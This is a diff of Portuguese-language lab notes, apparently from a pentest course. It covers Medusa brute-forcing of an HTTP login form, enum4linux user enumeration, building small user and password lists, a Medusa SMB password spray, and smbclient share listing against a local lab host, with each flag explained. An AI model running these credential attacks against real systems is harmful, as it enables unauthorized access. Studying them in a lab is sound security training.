@@ -30,3 +30,25 @@ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 -m 'FAIL=Login failed' -t 6
 // -m PAGE informa o caminho do formulário de login do servidor, -m FORM é o corpo da requisição, logo o Medusa vai substituir o USER e o PASS por cada linha do arquivo
 e o -m FAIL mostra a mensagem esperada caso o login seja malsucedido.
+
+//comando para enumeração de usuários
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+// -a ativa todas técnicas possiveis para enumeração e o tee serve para gravar a saída do comando em um arquivo txt
+
+// Comando para abrir o arquivo de texto que acabamos de criar
+less enum4_output.txt
+// less serve pra ver um arquivo grande de forma numerada em páginas para facilitar a leitura
+
+// Comando para criar lista de usuarios com os nomes retirados anteriormente
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+// Comando para criar lista de senhas para ser usada durante o spray
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+//Comando para usar o Medusa com spray
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+// -M é usado para ataques via SMB, -t é pra escolher quantos usuários vão testar as senhas, nesse caso 2 e -T mostra quantos hosts em paralelo, nesse caso 50
+
+//Comando para saber se conseguimos acesso como administrador
+smbclient -L //192.168.56.101 -U msfadmin
+//-L lista os compartilhamentos disponiveis em um servidor SMB
